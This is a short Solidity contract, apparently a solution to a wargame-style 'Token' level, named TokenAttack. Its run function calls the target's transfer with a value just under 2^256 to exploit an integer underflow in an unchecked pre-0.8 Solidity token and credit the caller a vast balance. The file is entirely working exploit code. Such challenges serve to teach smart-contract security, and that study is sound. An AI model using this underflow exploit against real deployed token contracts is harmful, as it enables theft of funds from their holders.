// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../levels/Token.sol';

contract TokenAttack {

    Token token; 

    constructor(address _token) public {
        token = Token(_token);
    }

    function run() public {
        token.transfer(msg.sender, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeb);
    }

}
